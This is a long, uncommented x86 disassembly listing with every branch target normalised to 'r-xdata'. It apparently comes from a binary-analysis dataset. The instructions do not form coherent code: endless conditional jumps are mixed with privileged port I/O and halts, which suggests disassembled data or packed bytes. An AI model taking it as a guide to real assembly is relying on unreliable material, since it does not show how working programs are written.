mov ebp 0x550a2366
sbb al 0x73
jae r-xdata
jecxz r-xdata
jecxz r-xdata
sub bx [ esi ]
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xe26aefae
jae r-xdata
jae r-xdata
and al 0xa6
pop edx
shl ebx cl
jecxz r-xdata
or cl [ ecx ]
nop [ esi * 4 + 0xabbbf89 ] ebx
jecxz r-xdata
or ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
or dh dl
add al 0x1c
jae r-xdata
mov [ 0x1c0af70a ] eax
jae r-xdata
jecxz r-xdata
jae r-xdata
shl [ ebx ] 0x1
mov [ edi + 0x41b66a85 ] edx
or ebp [ ebx ]
cmp ebx [ esp + ebx ]
jecxz r-xdata
or cl [ ecx + 0x73e3e3ea ]
mov ebx esp
jae r-xdata
push 0x34c70b25
jae r-xdata
or cl [ edi ]
jae r-xdata
jae r-xdata
cmp [ eax - 0x1c9c8ae4 ] dh
jecxz r-xdata
in al 0xe3
sbb al 0x97
sbb al 0x60
jae r-xdata
sbb al 0x1c
mov bl 0x1c
push ds
jae r-xdata
sbb al 0x1c
pushad
in al dx
push 0xa2cc811
jae r-xdata
mov bl 0x68
cmpsb [ esi ] [ edi ]
sbb ebp [ eax + 0x63 ]
inc edi
jecxz r-xdata
mov edx 0xd81fa66a
and ah ch
jecxz r-xdata
push 0xe085cda0
cmpsd [ esi ] [ edi ]
loop r-xdata
jae r-xdata
mov al 0xa
out dx eax
jae r-xdata
sbb al 0x73
jae r-xdata
or dh [ edi ]
or al 0x1c
mov ebx 0x1c33f30a
sbb al 0x73
jae r-xdata
jb r-xdata
xchg [ eax - 0x1e ] ebp
push 0xa368efa3
out dx eax
jecxz r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x74
arpl bx sp
mov esi 0x11390a37
sbb al 0x1c
cmp [ esp + ebx ] ebx
mov [ eax - 0x5441957b ] eax
mov eax 0xa9be6a85
push 0xbe6a853b
scasd [ edi ]
push 0xbe6a853a
lodsd [ esi ]
push 0x3810a3c
sbb al 0x1c
jae r-xdata
test [ edx ] 0x73731c1c
jae r-xdata
pushad
daa
out dx eax
or eax [ eax - 0x5 ]
jecxz r-xdata
mov ebx esp
mov ch 0xb
sub edi [ ebx ]
sbb al 0x1c
test [ edx - 0x62 ] ebp

fsub [ esp + ebp * 8 ]
cmp bl [ esp + ebx ]
aaa
sbb al 0x75
dec edi
jae r-xdata
xor al 0x1c
or eax edi
jae r-xdata
adc eax 0x73731c1c
jae r-xdata
jae r-xdata
or bl bh
or eax 0x73731c1c
add bl [ esp + ebx ]
sbb al 0x96
daa
jae r-xdata
sbb al 0xb3
jae r-xdata
enter 0xa2c 0xfe
jecxz r-xdata
jae r-xdata
push 0xffffffbe
aaa
or bh [ ecx ]
adc [ esp + ebx ] ebx
jecxz r-xdata
pushfd
jmp r-xdata
aaa
push 0xffffffa6
sbb al 0x1c
jae r-xdata
loop r-xdata
jae r-xdata
hlt
jae r-xdata
mov edx 0x73737320
or dh [ edx + 0x2f ]
sbb al 0x73
test [ edx - 0x5a ] ebp
pop ss
mov ebx 0x1c2f720a
sbb al 0x73
in al dx
add al 0x1c
test [ edx - 0x5a ] ebp
jae r-xdata
or [ edi ] ecx
jae r-xdata
push 0xe76afba3
jae r-xdata
sbb al 0x1c
sbb al 0x1c
jae r-xdata
popad
push ss
jae r-xdata
sbb al 0x73
jae r-xdata
sub [ esp + ebx ] ebx
jae r-xdata
mov ah 0x1c
mov ch 0xeb
sbb al 0x1c
jae r-xdata
jae r-xdata
push 0xef0f600f
jae r-xdata
sbb al 0x1c
jae r-xdata
or ch [ edi + edx ]
sbb al 0xb5
xchg [ eax + 0x2b ] esp
loope r-xdata
jae r-xdata
jae r-xdata
and ebp ebx
mov bl 0x1c
xchg esi eax
pop es
push 0xffffffbe
aas
sbb al 0xb4
sti
mov ah 0xb
pushad
sbb bl [ ebx + esi ]
or bl [ ebx + ebp * 8 + 0x7373e3e3 ]
mov al 0xb0
mov al 0x25
cmpsb [ esi ] [ edi ]
cvtdq2ps xmm4 [ esi ]
jae r-xdata
sbb al 0x1c
jae r-xdata
or ah [ edx + 0x731c1c02 ]
jae r-xdata
jecxz r-xdata
jae r-xdata
or dl [ ebx + 0x12 ]
sbb al 0x1c
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
sbb al 0x1c
jae r-xdata
or ch [ edx + 0x13 ]
sbb al 0x1c
jae r-xdata
and esp [ ebx + 0x1c0af70a ]
scasb [ di ]
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
test eax 0x6ee3e3e7
mov dh 0xb
or ah [ esi + 0x731c1c2f ]
sbb al 0x73
jae r-xdata
mov ch 0xeb
jae r-xdata
jae r-xdata
jae r-xdata
and al 0x1c
jae r-xdata
add al 0x1c
sbb al 0xb5
push 0x6012c813
and ah cl
nop
push 0xffffffa6
sbb ebp [ esi - 0x5a ]
or ah [ bx + si + 0xb ]
sbb al 0x1c
jae r-xdata
sbb al 0x6e
jae r-xdata
jae r-xdata
or dh [ esi - 0x76e3e3fc ]
mul [ bx ]
sbb al 0x1c
or al [ ebx + 0x6ae3e3e7 ]
cmpsb [ esi ] [ edi ]
pop ds
shl [ ebx ] 0x1
fisub [ esi + 0x25c80a1f ]
sbb al 0x1c
push 0xffffffa6
pop ds
fsub [ eax ]
in al dx
adc bl [ esp + ebx ]
mov edi esp
outsb
mov ebx 0x1c0c370a
jae r-xdata
mov ch 0x89
jae r-xdata
jae r-xdata
jae r-xdata
mov ch 0x68
adc ah [ esi + 0x15 ]
in al dx
adc edx [ bx ]
movsb [ edi ] [ esi ]
in al dx
or ebp [ ecx + 0x6ee3e3e7 ]
jae r-xdata
jae r-xdata
rcr [ edx + ecx ] 0x1
jae r-xdata
out 0xe3 eax
jae r-xdata
jae r-xdata
sbb al 0xa
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
push 0xfba368e3
push 0xffffffe7
or dh bl
xor ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
jae r-xdata
jmp r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or bh [ ebx ]
add bl [ esp + ebx ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov [ 0x731c1c02 ] al
jae r-xdata
pushad
lahf
mov al 0xb4
mov dh 0x68
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
mov bl 0x87
sbb al 0x96
push 0x13e0df93
jae r-xdata
cmp eax [ edx ]
sbb al 0x1c
nop
imul edx [ ebx - 0x1d ] 0xffffffe3
jecxz r-xdata
imul ebp [ esi + 0x17130aef ] 0x73731c1c
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
punpcklbw mmx1 [ edi ]
out dx eax
jae r-xdata
or bh [ esi + 0x2f ]
sbb al 0x1c
jae r-xdata
outsb
jae r-xdata
jae r-xdata
add [ esp + ebx ] bl
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or ah [ ecx - 0x18 ]
jecxz r-xdata
push 0x68301c12
and eax 0x1c16aa0a
fnstsw ax
jae r-xdata
dec esp
jae r-xdata
jae r-xdata
push ds
outsd
je r-xdata
jae r-xdata
jae r-xdata
pxor mm6 [ eax - 0x1f5df54c ]
jecxz r-xdata
jae r-xdata
or ecx [ edx ]
cmpsb [ esi ] [ edi ]
das
sbb al 0x1c
jae r-xdata
sbb al 0x74
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
outsb
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x73
jae r-xdata
or ch [ ebp + 0x1ce3e3e5 ]
adc esp [ edx - 0x23 ]
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
jae r-xdata
or cl [ ecx + ebp + 0x1c ]
jecxz r-xdata
jae r-xdata
jae r-xdata
mov ch 0x87
pushad
sub esp ecx
mov bl 0xa
sub al 0x17
cmpsb [ esi ] [ edi ]
sbb esi [ ebx - 0x1df4da98 ]
mov edx 0x66ec2366
push 0x6e1c1c37
jae r-xdata
or ah [ eax + esi * 8 + 0x7373e3e3 ]
jae r-xdata
or esp edx
mov bl 0x24
jae r-xdata
scasb [ edi ]
jae r-xdata
adc cl [ ecx + 0x24e389e3 ]
cmpsb [ esi ] [ edi ]
push ss
mov ebx esp
mov ebx esp
test [ esi ] esp
and eax 0x245b0fa6
cmpsb [ esi ] [ edi ]
shl [ ebx ] 0x1
mov [ edx + ebp * 2 ] ebx
sahf
pop ds
sbb al 0x75
outsd
jecxz r-xdata
mov esp edi
out dx eax
jae r-xdata
adc eax 0x190a1c1c
dec edi
jae r-xdata
jae r-xdata
test al 0xe3
jae r-xdata
dec di
mov al 0x6e
jae r-xdata
jae r-xdata
jae r-xdata
loop r-xdata
jae r-xdata
scasb [ edi ]
out dx eax
or dl [ ebx ]
pop ss
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
pop ss
or al dh
out 0xe3 al
jecxz r-xdata
jae r-xdata
and eax 0x1c24e20b
jecxz r-xdata
jae r-xdata
or ah [ edx - 0x451c1c20 ]
and bp sp
push 0x1c37
sbb al 0x6e
mov bl 0xb0
sbb al 0xb5
cmpsd [ esi ] [ edi ]
push 0xae681fa6
jecxz r-xdata
jae r-xdata
push 0xffffffe2
jae r-xdata
jae r-xdata
mov al 0x89
jecxz r-xdata
jae r-xdata
xor ebx [ esp + ebx ]
sbb al 0x1c
jae r-xdata
jae r-xdata
pop ebx
scasb [ edi ]
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
popad
mov edi 0x89e3e3ee
jecxz r-xdata
pop ds
shr [ edx ] 0x1
pushad
sbb ebx [ esp + ebp * 8 ]
jbe r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
mov ch 0xb5
imul esi ebx 0xe3e66d0a
jae r-xdata
jae r-xdata
jae r-xdata
and al 0xe3
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
out dx eax
mov [ esi + 0x2da66a85 ] edx
test [ edx - 0x5a ] ebp
xor ecx [ edx ]
pop ecx
cmp ebx [ esp + ebx ]
mov ebx esp
sbb al 0xb3
scasd [ edi ]
jae r-xdata
movsd [ edi ] [ esi ]
xlat
mov bl 0xa
sub al 0x16
sbb al 0x1c
jae r-xdata
mov edi esp
outsb
jae r-xdata
0xaa0ae3e3 0xe3f0
sub ebp [ ecx - 0xd ]
jae r-xdata
jae r-xdata
fsubrp st3
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
insd
out 0xe3 eax
jecxz r-xdata
or [ esp + ebx ] bl
sbb al 0x96
jae r-xdata
jae r-xdata
xchg edi eax
sbb al 0xba
mov edx 0x7373202a
jae r-xdata
or ch [ ebp - 0x1a ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
push 0xffffffaf
add ebp [ edx - 0x5a ]
xchg esi eax
jae r-xdata
push ebx
jae r-xdata
test [ edx ] 0x1c1c0f60
jae r-xdata
jae r-xdata
or esp ebx
jmp r-xdata
sbb ecx [ ebx - 0x7c0da6d2 ]
mov ah 0x6a
pop ebp
aaa
jecxz r-xdata
jae r-xdata
mov bl 0xb3
jecxz r-xdata
out 0x8b eax
jecxz r-xdata
retn
sahf
rol [ esi + 0x53 ] cl
mov ah 0x6a
movsd [ edi ] [ esi ]
out dx eax
or ch [ ebx ]
cmp [ esp + ebx ] ebx
jae r-xdata
jecxz r-xdata
or ch [ ebp - 0x1a ]
jae r-xdata
mov [ ebp - 0x59957b ] ecx
or bh [ edi - 0x16 ]
mov ah 0x66
sub ch ah
jecxz r-xdata
out 0xe3 al
push 0x22e0dfa2
in al dx
mov ecx 0xda85e3e3
jae r-xdata
or eax esp
sbb al 0xa
sbb [ ebx ] esi
sbb al 0x1c
enter 0x692b 0xf3
jae r-xdata
jg r-xdata
jae r-xdata
out dx eax
sbb al 0x1c
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
mov bl 0xa6
jecxz r-xdata
jae r-xdata
jae r-xdata
loop r-xdata
jae r-xdata
arpl bx sp
jae r-xdata
cmpsb [ esi ] [ edi ]
aas
out 0x6e eax
push 0xb66a8532
nop [ ecx + edi * 4 ] ebx
test [ edx - 0x4a ] ebp
jae r-xdata
pushad
jae r-xdata
jae r-xdata
add eax edx
xor [ ecx - 0x49957a73 ] ecx
push 0xffffffb6
or esi esp
in al 0xe3
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
loop r-xdata
jecxz r-xdata
jecxz r-xdata
pop es
sbb al 0x1c
add bh [ esi ]
mov edx 0x73202aba
jae r-xdata
test al 0xe3
mov ch 0xb4
sub ch ah
insd
jae r-xdata
fsub [ eax ]
or ch [ edx + 0x73e3e3f0 ]
jae r-xdata
or cl al
xor bl [ esp + ebx ]
shr [ 0x6aba1c1c ] 0x1
jae r-xdata
sbb al 0x1c
jecxz r-xdata
jae r-xdata
xchg esi eax
jae r-xdata
mov dh 0x1b
push 0xe60a1fa6
jae r-xdata
or [ edx ] ecx
cmpsb [ esi ] [ edi ]
jae r-xdata
mov ecx [ esi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
out dx al
jecxz r-xdata
mov ecx 0x1b66a85
sbb al 0x1c
jae r-xdata
jae r-xdata
pop ebx
push 0xef900a33
jecxz r-xdata
sub esp ebx
jecxz r-xdata
movsb [ edi ] [ esi ]
cmp [ esp + ebx ] bl
jae r-xdata
scasb [ edi ]
or [ esp + ebx ] bl
mov bl 0xb0
jae r-xdata
jae r-xdata
adc [ esp + ebx ] ebx
jae r-xdata
or dl [ esi ]
mov [ 0x1f86609b ] eax
jecxz r-xdata
sbb al 0x1c
mov bl 0x6e
push di
sbb ebx [ esp + ebx ]
mov bl 0xa
push ss
sub ebx [ esi ]
or bh [ edx + 0x73e3e3e8 ]
jae r-xdata
and bp sp
jae r-xdata
push 0xffffffa6
jecxz r-xdata
jae r-xdata
mov ebx 0xc39368c7
jae r-xdata
and cx [ edx ]
sbb esp edx
push 0xb31ceba6
jae r-xdata
out 0x6e eax
sbb al 0x1c
arpl [ esi + 0x66ece2f3 ] bx
add bh [ esi ]
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
pop es
test [ edx - 0x4a ] ebp
jecxz r-xdata
pop esp
sbb al 0x1c
jae r-xdata
das
jae r-xdata
loop r-xdata
sbb al 0x1c
outsb
in al 0xe3
jecxz r-xdata
or ebp edi
sbb al 0x1c
mov al 0x89
jae r-xdata
jae r-xdata
jecxz r-xdata
and ch [ eax - 0x65 ]
[ eax - 0x45 ]
mov al 0x1c
jae r-xdata
mov eax 0xa1c1c00
and eax 0x731c1c2b
jae r-xdata
in al dx
jecxz r-xdata
jecxz r-xdata
lea edx [ esi ]
sbb al 0x1c
jae r-xdata
and ecx [ edx ]
loop r-xdata
loopne r-xdata
push 0xa368c393
jae r-xdata
jecxz r-xdata
lea eax [ ebp + 0xaffa66a ]
sbb al 0x1c
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
jecxz r-xdata
les ecx [ 0x27601c1c ]
cmpsb [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
mov ecx 0x661c1c01
and ebp esp
out 0xe3 eax
jecxz r-xdata
shl [ ecx ] 0x1
mov dh 0x1
jecxz r-xdata
rcr [ esp ] 0x1
and bp sp
out dx al
aam 0x3f
sbb al 0x1c
push 0x236033a6
fcom [ ebx ]
or ah [ ecx - 0x1b ]
sbb al 0x89
jecxz r-xdata
or dh [ ebp - 0xe ]
jecxz r-xdata
or eax 0xa46e1c1c
jae r-xdata
retn
jae r-xdata
sbb al 0x96
or ebx [ esp + esi * 2 ]
jcxz r-xdata
loop r-xdata
shl ebx 0x1
jecxz r-xdata
mov [ 0xffffffffec22e0df ] al
hlt
jae r-xdata
mov al 0x6e
sub bx [ esi ]
sbb al 0x1c
jae r-xdata
push 0xffffffa6
sbb al 0x1c
loopne r-xdata
retn
jae r-xdata
jae r-xdata
mov ebx esp
or ch [ ebp - 0x19 ]
jecxz r-xdata
mov edx 0xffc7a76a
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov eax [ esi + 0x5a ]
jecxz r-xdata
sbb al 0xb4
jae r-xdata
jae r-xdata
sbb al 0x96
lahf
push 0xffffff9f
sbb al 0xb
mov edx [ esi ]
sbb al 0x1c
push 0xaa68ebae
fild [ eax - 0x4b ]
mov bl 0xa
insb
or ecx [ ebx + 0x681c1c16 ]
scasb [ edi ]
mov bl 0xaf
jae r-xdata
movsb [ edi ] [ esi ]
sbb al 0x6e
sbb al 0xb4
mov al 0xa
jae r-xdata
mov edx [ eax ]
xchg edi eax
xchg [ eax + 0x38a40ab4 ] dh
sbb al 0x1c
jecxz r-xdata
xor [ esp + ebx ] edx
rcr [ esp + esi * 4 ] 0x1
mov ah 0xa
movsd [ edi ] [ esi ]
cmp ebx [ esp + ebx ]
jae r-xdata
or bl [ ecx ]
pop edi
add eax 0x6eb01c1c
sbb esp [ esi + 0x23 ]
in al dx
outsb
das
sbb al 0x1c
shl [ ebx ] 0x1
mov esp 0x202ab8bd
mov [ 0xffffffffe01ae0fb ] eax
jae r-xdata
cmpsd [ esi ] [ edi ]
or edx ecx
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
xchg [ esi + edx * 4 ] ebx
sbb al 0xb3
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sti
push 0x65
pop ss
jecxz r-xdata
sbb al 0x60
daa
jecxz r-xdata
div [ si - 0xff5 ]
or eax 0xbaba1c1c
and bp sp
jmp r-xdata
inc esi
pop edx
mov bh 0xa
jae r-xdata
jae r-xdata
sbb al 0x75
add esp ebx
jecxz r-xdata
sbb al 0x96
pop ds
sbb al 0x96
pop es
sbb al 0x33
or cl cl
cmp bl [ esp + ebx ]
jae r-xdata
mov [ ebp + 0x7b66a85 ] ecx
cmp esp ebx
jecxz r-xdata
xchg esi eax
jae r-xdata
push edx
sbb bl [ esp + ebx ]
jae r-xdata
mov ebp [ esi ]
pop ecx
xor [ edx + ebp * 2 - 0x1c1cc8a3 ] 0xffffffe3
or ebp [ esi - 0x74e3e3f8 ]
adc [ edi + 0xab4b086 ] dl
and ebp [ edx - 0x42 ]
add ebp [ edx - 0x42 ]
pop ss
test eax ebx
movsd [ edi ] [ esi ]
in eax 0xec
pushad
jmp r-xdata
jae r-xdata
loopne r-xdata
jae r-xdata
sub eax 0x6aba1c1c
jae r-xdata
jae r-xdata
jae r-xdata
popad
call 0x73ba3222
nop [ ebx + esi * 2 ] ebx
jae r-xdata
push 0xffffffb6
sbb ebp [ eax - 0x5a ]
pop ds
or ah dh
xchg ebx eax
jae r-xdata
sbb al 0x73
mov al [ 0x2366bad7 ]
in al dx
shl ebp 0x1
or eax 0x1b656ab0
jecxz r-xdata
push cs
mov bl 0x68
and eax 0x1c12d80b
adc bh dh
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb5
scasd [ edi ]
or cl bh
sub [ esp + ebx ] ebx
jae r-xdata
sbb ebp [ eax + 0x3d ]
test [ edx - 0x42 ] ebp
jae r-xdata
mov al 0xb0
mov ebx eax
mov al 0xb0
or dl [ edx + 0x1a ]
sbb al 0x1c
sbb al 0x73
jae r-xdata
outsb
cmpsd [ esi ] [ edi ]
mov [ 0x27c60a1d ] al
sbb al 0x1c
jae r-xdata
sbb al 0x1c
jae r-xdata
mov dh 0x7
sbb [ eax + 0x3b ] ebp
test [ edx - 0x42 ] ebp
pop ds
or ah [ ebx ]
aaa
sbb al 0x1c
jae r-xdata
test [ edx - 0x42 ] ebp
adc ecx [ ecx + 0x6a85b896 ]
mov esi 0xb88a8911
test [ edx - 0x42 ] ebp
pop ss
push 0xbe6a853c
adc eax 0x6a853b68
mov esi 0x853d681b
push 0xffffffbe
cmp ah al
push 0xffffffa6
add [ ebx + 0x6a85c189 ] edi
cmpsb [ esi ] [ edi ]
pop es
or bl ch
sbb ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
sbb al 0xba
jae r-xdata
jecxz r-xdata
pushad
and [ edx ] cl
enter 0x1c32 0x1c
jae r-xdata
loopne r-xdata
mov bl 0x1c
mov ch 0xeb
pushad
cwde
mov [ 0xffffffffcb67ece3 ] eax
jecxz r-xdata
jecxz r-xdata
push 0x36d40b1d
sbb al 0x1c
pushad
daa
out dx eax
fiadd [ ebx - 0x131c1cf7 ]
in eax 0xe3
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
or bl [ esp + ebx ]
jae r-xdata
sbb al 0xba
and bp sp
sub [ es : esp + ebx ] bl
and ch ah
push ebx
pop ebp
sbb al 0x1c
or al [ ebx ]
sbb al 0x1c
jae r-xdata
jecxz r-xdata
shl [ ebx ] 0x1
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xffffffa7
jae r-xdata
jae r-xdata
stosb [ edi ]
in al dx
cmpsd [ esi ] [ edi ]
out 0xe3 eax
daa
sbb bl [ esp + ebx ]
push 0x66bad7a0
and ebp esp
jecxz r-xdata
mov ah [ ebx - 0x1cd8aae4 ]
jecxz r-xdata
mov [ 0xffffffffd0ebb51c ] eax
sbb al 0xa
sbb al 0x90
outsb
jae r-xdata
jae r-xdata
and bp sp
inc eax
adc [ esp + ebx ] bl
sbb al 0x1c
mov ch 0xaf
jecxz r-xdata
xlat
sbb al 0x6a
jae r-xdata
or al [ ebx + 0xb ]
sbb al 0x1c
in al dx
push esp
test [ edx - 0xd ] ebp
test [ esi + 0x31 ] esp
or ah dh
sbb [ esp + ebx ] ebx
jae r-xdata
or ah [ ecx + 0x36 ]
sbb al 0x1c
out dx eax
jecxz r-xdata
mov edi 0xc7a76ee3
jae r-xdata
jae r-xdata
jae r-xdata
xchg [ 0x73731c1c ] dl
jae r-xdata
push 0xffffffa5
jae r-xdata
push 0x1ae0fba3
jae r-xdata
loope r-xdata
jae r-xdata
mov ah 0xb7
jae r-xdata
jae r-xdata
iretd
movsd [ edi ] [ esi ]
outsb
sub bx [ esi ]
sbb al 0x1c
mov bl 0xb0
mov al 0x89
stc
mov al 0x1c
jne r-xdata
jae r-xdata
jecxz r-xdata
pushad
daa
out dx eax
pushad
xchg edi eax
jae r-xdata
push 0xffffffae
pushad
jecxz r-xdata
sbb al 0x75
arpl bx sp
jecxz r-xdata
mov ebp 0x73202ab8
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sti
jae r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
or dh [ ebx + 0x37 ]
jae r-xdata
mov eax [ ecx + 0x45 ]
or [ eax ] 0xb4
or eax [ ebx - 0x74e3e3f6 ]
lodsb [ ss : esi ]
xchg ecx eax
sub [ esp + ebx ] ebx
or eax [ edi + esi ]
adc esi [ edx + ecx + 0x1c1c5d3a ]
jae r-xdata
xchg esi eax
sbb eax 0x73731c1c
jae r-xdata
mov ah 0xb4
mov al 0xa
mov [ edx ] ss
sbb al 0x1c
jae r-xdata
sub al 0x1c
pushfd
jae r-xdata
cmpsd [ esi ] [ edi ]
mov edi 0x1c39070a
sbb al 0x73
jae r-xdata
mov ah 0x6a
movsd [ edi ] [ esi ]
fisttp [ edx ]
or al [ ebx + 0x8 ]
sbb al 0x1c
sub ah [ eax ]
jae r-xdata
jae r-xdata
jae r-xdata
and edi [ ebp + 0x73202ab8 ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0xa7
sbb ah al
jae r-xdata
or ah [ ebp + 0x1ce3e3e3 ]
jae r-xdata
aaa
jae r-xdata
0x7373e3e3 0xb073
mov dl 0x1c
xchg ebx eax
pop ds
push 0xebaee0eb
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
xchg edi eax
jae r-xdata
sbb al 0x1c
and bp sp
xchg esi eax
aaa
and esp ebx
mov eax 0x7373202a
jae r-xdata
jae r-xdata
out 0xe3 eax
in al dx
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
outsw
sbb al 0x6e
jae r-xdata
jae r-xdata
push 0xffffffa6
jmp r-xdata
jae r-xdata
shr [ edx ] 0x1
and bp sp
jpe r-xdata
and ebp esp
outsb
sbb [ si ] bl
adc eax 0xa66a85bb
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
outsb
outsb
sbb ebx [ esi ]
sbb al 0x1c
or bh [ esp + edi ]
sbb al 0x1c
jae r-xdata
and [ ebx + 0x73 ] dh
loopne r-xdata
jae r-xdata
push 0x65878b3b
adc [ esi - 0x5442954c ] dl
or ecx [ ebp + 0x6a1c1c0a ]
adc ch [ edx - 0x5a ]
mov ah 0x6a
movsd [ edi ] [ esi ]
jecxz r-xdata
jae r-xdata
jae r-xdata
add [ ebx ] edi
sti
jae r-xdata
sbb al 0x1c
scasb [ edi ]
jmp r-xdata
jae r-xdata
jmp r-xdata
or bl [ edx - 0x7ae3e3cd ]
push 0xffffffa6
mov ebx 0x1ba66a85
shl [ ebx ] 0x1
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
jae r-xdata
jne r-xdata
in al dx
push esp
mov al 0x60
and ah cl
mov ah 0x68
sbb [ edx ] ecx
or ebx [ ebp + 0x1c ]
sbb al 0x73
jae r-xdata
cmp [ esp + ebx ] ebp
jecxz r-xdata
and esp ebx
jae r-xdata
xchg edi eax
jae r-xdata
jne r-xdata
jae r-xdata
mov ch 0x68
jae r-xdata
xor ebx [ esi ]
cmpsb [ esi ] [ edi ]
sbb esi [ ebx + 0x1c1d050a ]
sbb al 0x73
jae r-xdata
mov [ eax + 0x1c2b140a ] edx
sbb al 0x73
jae r-xdata
or al [ ecx ]
jae r-xdata
push 0x2f730a1b
sbb edx eax
and eax [ ebp - 0x74e65996 ]
out 0xe2 eax
jecxz r-xdata
push 0xffffffa6
sbb al 0x74
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
inc ebx
mov bl 0x68
and eax 0x1c31340a
sbb al 0x73
mov dl 0xb0
mov ch 0xa
inc ebx
or ebx [ esp + ebx ]
push 0x223a0b25
sbb al 0x1c
mov edx 0x66ec2366
sub [ es : esp + ebx ] bl
sbb al 0xa
jae r-xdata
mov esp edi
loop r-xdata
jecxz r-xdata
push 0x202aeba6
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
and al 0xa
jae r-xdata
xchg ebp eax
jae r-xdata
mov al 0xb5
jae r-xdata
cmp ebx [ esp + ebx ]
jae r-xdata
sbb al 0x95
arpl bx sp
jae r-xdata
sbb al 0xb3
push 0xb31ceba6
sbb [ si ] bl
jae r-xdata
jae r-xdata
jae r-xdata
shl [ edx + ebp * 2 + 0x390adba5 ] 0x2c
sbb al 0x1c
jecxz r-xdata
jae r-xdata
movsd [ edi ] [ esi ]
jae r-xdata
and [ esp + ebx ] ebp
jecxz r-xdata
sbb al 0x1c
jecxz r-xdata
jae r-xdata
jae r-xdata
or bh [ esi + 0x731c1c5f ]
xchg edi eax
pop dx
sub al 0x1c
sbb al 0xa
sbb al 0xa
xchg [ edi ] esi
sbb al 0x1c
in al dx
push 0xec156613
jecxz r-xdata
jae r-xdata
sbb [ ebx - 0x1c1c1d19 ] ecx
push 0xffffffa6
sbb al 0x93
push 0xe8e30a24
jae r-xdata
adc [ ebx + 0x140a9089 ] edi
sub ebx [ esp + ebx ]
sbb al 0x73
test [ edx - 0x5a ] ebp
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
inc ebx
or [ esp + ebx ] bl
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffa6
xor eax 0x1c1d6a0a
sbb al 0x73
jae r-xdata
jae r-xdata
pushfd
aas
sbb al 0x1c
jae r-xdata
sbb al 0x73
jae r-xdata
0x681c1c5e 0xf3a6
adc esp [ esi + 0x15 ]
in al dx
jae r-xdata
jae r-xdata
jae r-xdata
sbb eax edx
jae r-xdata
jae r-xdata
or ah bl
jae r-xdata
jae r-xdata
sub ah [ esi + 0x23 ]
in al dx
jae r-xdata
mov bl 0x68
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
sub al 0x1c
jae r-xdata
or [ esp + ebx ] ebx
int1
jae r-xdata
int3
jae r-xdata
or ecx ecx
jae r-xdata
sbb al 0x1c
leave
jae r-xdata
push ebp
in al 0xb3
bound esp [ ecx + ebp ]
jecxz r-xdata
in al dx
jae r-xdata
jae r-xdata
or esi ecx
jecxz r-xdata
and eax [ ebp + 0x6e1fa66a ]
mov bl 0x1c
xchg esi eax
outsb
call 0x73ba3808
jae r-xdata
out 0x68 eax
jae r-xdata
mov bl 0xa
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
push 0xffffffa5
mov dh 0xa
mov ah 0x39
outsb
pushad
sahf
out dx eax
jecxz r-xdata
iretd
outsb
mov dh 0x17
or ebp ecx
or [ esp + ebx ] ebx
or bl [ esi + eax ]
